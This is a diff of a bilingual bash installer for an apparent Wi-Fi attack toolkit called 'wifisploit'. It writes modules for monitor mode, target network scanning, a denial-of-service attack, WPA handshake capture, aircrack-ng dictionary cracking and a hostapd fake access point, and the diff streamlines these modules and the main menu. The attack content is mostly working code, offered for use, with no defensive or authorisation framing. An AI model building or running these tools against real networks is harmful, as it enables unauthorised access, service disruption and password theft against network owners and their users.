@@ -2,6 +2,7 @@
 
 # 创建目录结构
 mkdir -p wifisploit/modules
+mkdir -p /tmp/wifisploit/fake_ap
 
 # 选择语言版本
 echo "Select language (选择语言):"
@@ -91,7 +92,7 @@ kill \$!
 # 显示扫描结果并让用户选择目标
 awk 'BEGIN{if ("$LANG_SUFFIX" == "_zh") print "编号\tBSSID\t\t\t频道\t加密\t信号\tSSID"; else print "Num\tBSSID\t\t\tChannel\tEncryption\tSignal\tSSID"} /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {printf "%d\t%s\t%s\t%s\t%s\t%s\n", NR, \$1, \$6, \$8, \$4, \$14}' /tmp/network_scan.txt
 
-if [ "$LANG_SUFFIX" == "_zh" ]; then
+if [ "$LANG_SUFFIX" == "_zh" ];then
   read -p "选择目标网络的编号: " TARGET_NUMBER
 else
   read -p "Select the target network number: " TARGET_NUMBER
@@ -103,7 +104,7 @@ TARGET_CHANNEL=\$(awk -v num=\$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print \$
 echo \$TARGET_BSSID > /tmp/current_target_bssid
 echo \$TARGET_CHANNEL > /tmp/current_target_channel
 
-if [ "$LANG_SUFFIX" == "_zh" ]; then
+if [ "$LANG_SUFFIX" == "_zh" ];then
   echo "已选择目标网络: BSSID=\$TARGET_BSSID, 频道=\$TARGET_CHANNEL"
 else
   echo "Selected target network: BSSID=\$TARGET_BSSID, Channel=\$TARGET_CHANNEL"
@@ -200,16 +201,16 @@ kill \$AIRODUMP_PID
 
 # 检查是否已捕获到握手包
 if [ -f capture-01.cap ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
     echo "成功捕获到握手包，保存在 capture-01.cap"
   else
     echo "Successfully captured handshake, saved as capture-01.cap"
   fi
 else
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "未捕获到握手包，请重试或检查目标网络状态。"
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "未能捕获到握手包，请重试。"
   else
-    echo "Failed to capture handshake, please retry or check the target network status."
+    echo "Failed to capture handshake, please try again."
   fi
   exit 1
 fi
@@ -219,9 +220,8 @@ EOF
 cat << EOF > wifisploit/modules/crack_handshake.sh
 #!/bin/bash
 
-CAPTURE_FILE="capture-01.cap"
-TARGET_BSSID=\$(cat /tmp/current_target_bssid)
 DICTIONARY_PATH=\$1
+CAPTURE_FILE=capture-01.cap
 
 if [ -z "\$DICTIONARY_PATH" ]; then
   if [ "$LANG_SUFFIX" == "_zh" ]; then
@@ -234,9 +234,9 @@ fi
 
 if [ ! -f "\$CAPTURE_FILE" ]; then
   if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "握手包文件 \$CAPTURE_FILE 不存在。"
+    echo "未找到捕获的握手包，请先捕获握手包。"
   else
-    echo "Handshake file \$CAPTURE_FILE does not exist."
+    echo "Capture file not found, please capture handshake first."
   fi
   exit 1
 fi
@@ -244,36 +244,21 @@ fi
 if [ "$LANG_SUFFIX" == "_zh" ]; then
   echo "开始破解握手包..."
 else
-  echo "Starting to crack the handshake..."
+  echo "Starting to crack handshake..."
 fi
 
-aircrack-ng -w \$DICTIONARY_PATH -b \$TARGET_BSSID \$CAPTURE_FILE
-
-if [ "$?" -eq 0 ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "握手包破解成功。"
-  else
-    echo "Successfully cracked the handshake."
-  fi
-else
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "未能破解握手包，请检查字典文件并重试。"
-  else
-    echo "Failed to crack the handshake, please check the dictionary file and retry."
-  fi
-  exit 1
-fi
+aircrack-ng -w \$DICTIONARY_PATH \$CAPTURE_FILE
 EOF
 
 # 创建 create_fake_ap.sh
 cat << EOF > wifisploit/modules/create_fake_ap.sh
 #!/bin/bash
 
-FAKE_AP_INTERFACE=\$1
-FAKE_AP_SSID=\$2
-FAKE_AP_CHANNEL=\$3
+AP_INTERFACE=\$1
+AP_SSID=\$2
+AP_CHANNEL=\$3
 
-if [ -z "\$FAKE_AP_INTERFACE" ] || [ -z "\$FAKE_AP_SSID" ] || [ -z "\$FAKE_AP_CHANNEL" ]; then
+if [ -z "\$AP_INTERFACE" ] || [ -z "\$AP_SSID" ] || [ -z "\$AP_CHANNEL" ]; then
   if [ "$LANG_SUFFIX" == "_zh" ]; then
     echo "用法: \$0 <interface> <SSID> <channel>"
   else
@@ -283,98 +268,118 @@ if [ -z "\$FAKE_AP_INTERFACE" ] || [ -z "\$FAKE_AP_SSID" ] || [ -z "\$FAKE_AP_CH
 fi
 
 if [ "$LANG_SUFFIX" == "_zh" ]; then
-  echo "创建假AP，SSID: \$FAKE_AP_SSID，频道: \$FAKE_AP_CHANNEL..."
+  echo "创建假的AP: SSID=\$AP_SSID, 频道=\$AP_CHANNEL, 接口=\$AP_INTERFACE..."
 else
-  echo "Creating fake AP with SSID: \$FAKE_AP_SSID, Channel: \$FAKE_AP_CHANNEL..."
+  echo "Creating fake AP: SSID=\$AP_SSID, Channel=\$AP_CHANNEL, Interface=\$AP_INTERFACE..."
 fi
 
-# 配置 hostapd
+# 配置hostapd.conf
 cat << EOL > /tmp/wifisploit/fake_ap/hostapd.conf
-interface=\$FAKE_AP_INTERFACE
-driver=nl80211
-ssid=\$FAKE_AP_SSID
-channel=\$FAKE_AP_CHANNEL
-hw_mode=g
-auth_algs=1
-wpa=2
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP CCMP
-wpa_passphrase=Password123
+interface=\$AP_INTERFACE
+ssid=\$AP_SSID
+channel=\$AP_CHANNEL
 EOL
 
-# 启动 hostapd
-hostapd /tmp/wifisploit/fake_ap/hostapd.conf &
-HOSTAPD_PID=\$!
-
-sleep 5
-
-# 配置 dnsmasq
-cat << EOL > /tmp/wifisploit/fake_ap/dnsmasq.conf
-interface=\$FAKE_AP_INTERFACE
-dhcp-range=10.10.0.10,10.10.0.50,12h
-dhcp-option=3,10.10.0.1
-dhcp-option=6,10.10.0.1
-EOL
-
-# 启动 dnsmasq
-dnsmasq -C /tmp/wifisploit/fake_ap/dnsmasq.conf
-
-if [ "$LANG_SUFFIX" == "_zh" ]; then
-  echo "假AP已创建并运行。"
-else
-  echo "Fake AP created and running."
-fi
-
-trap "kill \$HOSTAPD_PID; exit" SIGINT
-wait \$HOSTAPD_PID
+hostapd /tmp/wifisploit/fake_ap/hostapd.conf
 EOF
 
-# 赋予执行权限
-chmod +x wifisploit/modules/*.sh
-
-# 创建主脚本
-cat << EOF > wifisploit/wifisploit.sh
+# 创建主脚本 wifisploit.sh
+cat << EOF > wifisploit.sh
 #!/bin/bash
 
-# 选择模块
-echo "Select module (选择模块):"
-echo "1) Set Monitor Mode"
-echo "2) Scan Networks"
-echo "3) DOS Attack"
-echo "4) Capture Handshake"
-echo "5) Crack Handshake"
-echo "6) Create Fake AP"
-read -p "Enter choice: " module_choice
+while true; do
+  # 选择模块
+  if [ "$LANG_SUFFIX" == "_zh" ]; then
+    echo "选择模块:"
+    echo "1) 设置监听模式 - 将无线网卡设置为监听模式以捕获数据包。"
+    echo "2) 扫描网络 - 扫描周围的Wi-Fi网络。"
+    echo "3) DOS攻击 - 对目标网络进行拒绝服务攻击。"
+    echo "4) 捕获握手包 - 捕获目标网络的握手包。"
+    echo "5) 破解握手包 - 使用字典文件破解捕获的握手包。"
+    echo "6) 创建假的AP - 创建一个假的Wi-Fi接入点。"
+    echo "7) 退出 - 退出脚本。"
+    read -p "输入选择: " module_choice
+  else
+    echo "Select module:"
+    echo "1) Set Monitor Mode - Set the wireless interface to monitor mode to capture packets."
+    echo "2) Scan Networks - Scan surrounding Wi-Fi networks."
+    echo "3) DOS Attack - Perform a denial-of-service attack on the target network."
+    echo "4) Capture Handshake - Capture handshake packets from the target network."
+    echo "5) Crack Handshake - Crack the captured handshake using a dictionary file."
+    echo "6) Create Fake AP - Create a fake Wi-Fi access point."
+    echo "7) Exit - Exit the script."
+    read -p "Enter choice: " module_choice
+  fi
 
-case \$module_choice in
-  1)
-    wifisploit/modules/set_monitor_mode.sh
-    ;;
-  2)
-    wifisploit/modules/scan_networks.sh
-    ;;
-  3)
-    wifisploit/modules/dos_attack.sh
-    ;;
-  4)
-    wifisploit/modules/capture_handshake.sh
-    ;;
-  5)
-    read -p "Enter dictionary path: " dict_path
-    wifisploit/modules/crack_handshake.sh \$dict_path
-    ;;
-  6)
-    read -p "Enter interface: " ap_interface
-    read -p "Enter SSID: " ap_ssid
-    read -p "Enter channel: " ap_channel
-    wifisploit/modules/create_fake_ap.sh \$ap_interface \$ap_ssid \$ap_channel
-    ;;
-  *)
-    echo "Invalid choice"
-    ;;
-esac
+  case $module_choice in
+    1)
+      if [ "$LANG_SUFFIX" == "_zh" ]; then
+        read -p "输入接口: " interface
+      else
+        read -p "Enter interface: " interface
+      fi
+      ./wifisploit/modules/set_monitor_mode.sh $interface
+      ;;
+    2)
+      ./wifisploit/modules/scan_networks.sh
+      ;;
+    3)
+      ./wifisploit/modules/dos_attack.sh
+      ;;
+    4)
+      ./wifisploit/modules/capture_handshake.sh
+      ;;
+    5)
+      if [ "$LANG_SUFFIX" == "_zh" ]; then
+        read -p "输入字典路径: " dict_path
+      else
+        read -p "Enter dictionary path: " dict_path
+      fi
+      ./wifisploit/modules/crack_handshake.sh $dict_path
+      ;;
+    6)
+      if [ "$LANG_SUFFIX" == "_zh" ]; then
+        read -p "输入接口: " ap_interface
+        read -p "输入SSID: " ap_ssid
+        read -p "输入频道: " ap_channel
+      else
+        read -p "Enter interface: " ap_interface
+        read -p "Enter SSID: " ap_ssid
+        read -p "Enter channel: " ap_channel
+      fi
+      ./wifisploit/modules/create_fake_ap.sh $ap_interface $ap_ssid $ap_channel
+      ;;
+    7)
+      if [ "$LANG_SUFFIX" == "_zh" ]; then
+        echo "退出..."
+      else
+        echo "Exiting..."
+      fi
+      exit 0
+      ;;
+    *)
+      if [ "$LANG_SUFFIX" == "_zh" ]; then
+        echo "无效的选择"
+      else
+        echo "Invalid choice"
+      fi
+      ;;
+  esac
+
+  if [ "$LANG_SUFFIX" == "_zh" ]; then
+    echo "返回主菜单..."
+  else
+    echo "Returning to main menu..."
+  fi
+done
 EOF
 
-chmod +x wifisploit/wifisploit.sh
+# 设置脚本可执行权限
+chmod +x wifisploit/modules/*.sh
+chmod +x wifisploit.sh
 
-echo "Installation completed. To run wifisploit, use: ./wifisploit/wifisploit.sh"
+if [ "$LANG_SUFFIX" == "_zh" ]; then
+  echo "部署完成！运行 ./wifisploit.sh 启动脚本。"
+else
+  echo "Deployment complete! Run ./wifisploit.sh to start the script."
+fi
